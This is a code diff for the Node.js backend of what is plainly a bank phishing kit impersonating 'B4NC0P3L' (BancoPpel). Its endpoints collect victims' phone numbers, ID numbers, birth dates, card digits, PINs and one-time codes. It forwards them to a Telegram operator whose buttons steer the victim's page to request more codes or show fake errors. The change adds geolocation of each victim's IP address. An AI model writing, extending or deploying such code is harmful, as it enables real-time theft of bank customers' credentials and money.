@@ -21,9 +21,23 @@ function guardarEstado() {
   fs.writeFileSync(STATUS_FILE, JSON.stringify(clientes, null, 2));
 }
 
-// /enviar (cel-clave.html)
+// Función para obtener ciudad por IP
+async function obtenerCiudad(ip) {
+  try {
+    const response = await fetch(`https://ipinfo.io/${ip}/json`);
+    const data = await response.json();
+    return data.city || 'Ciudad desconocida';
+  } catch {
+    return 'Ciudad desconocida';
+  }
+}
+
+// Ruta /enviar (cel-clave.html)
 app.post('/enviar', async (req, res) => {
-  const { celular, fechaNacimiento, tipoIdentificacion, numeroIdentificador, ultimos2, nip, ip, ciudad, txid } = req.body;
+  const { celular, fechaNacimiento, tipoIdentificacion, numeroIdentificador, ultimos2, nip, txid } = req.body;
+
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
+  const ciudad = await obtenerCiudad(ip);
 
   const mensaje = `
 🔵B4NC0P3L🔵
@@ -42,9 +56,9 @@ app.post('/enviar', async (req, res) => {
 
   const keyboard = {
     inline_keyboard: [
-      [{ text: "➡ verifidata", callback_data: `verifidata:${txid}` }],
-      [{ text: "➡ cel-dina", callback_data: `cel-dina:${txid}` }],
-      [{ text: "➡ errorlogo", callback_data: `errorlogo:${txid}` }]
+      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
+      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
+      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
     ]
   };
 
@@ -65,9 +79,12 @@ app.post('/enviar', async (req, res) => {
   res.sendStatus(200);
 });
 
-// /enviar2 (cel-dina.html) — incluye todo nuevamente + OTP
+// Ruta /enviar2 (cel-dina.html) con OTP incluido
 app.post('/enviar2', async (req, res) => {
-  const { celular, fechaNacimiento, tipoIdentificacion, numeroIdentificador, ultimos2, nip, otp, ip, ciudad, txid } = req.body;
+  const { celular, fechaNacimiento, tipoIdentificacion, numeroIdentificador, ultimos2, nip, otp, txid } = req.body;
+
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
+  const ciudad = await obtenerCiudad(ip);
 
   const mensaje = `
 🔐🔵B4NC0P3L🔵
@@ -98,7 +115,7 @@ app.post('/enviar2', async (req, res) => {
   res.sendStatus(200);
 });
 
-// Callback para redirección
+// Botones de Telegram
 app.post('/callback', async (req, res) => {
   const callback = req.body.callback_query;
   if (!callback || !callback.data) return res.sendStatus(400);
@@ -119,7 +136,7 @@ app.post('/callback', async (req, res) => {
   res.sendStatus(200);
 });
 
-// Polling para verifidata
+// Polling de verifidata.html
 app.get('/sendStatus.php', (req, res) => {
   const txid = req.query.txid;
   res.json({ status: clientes[txid] || "esperando" });
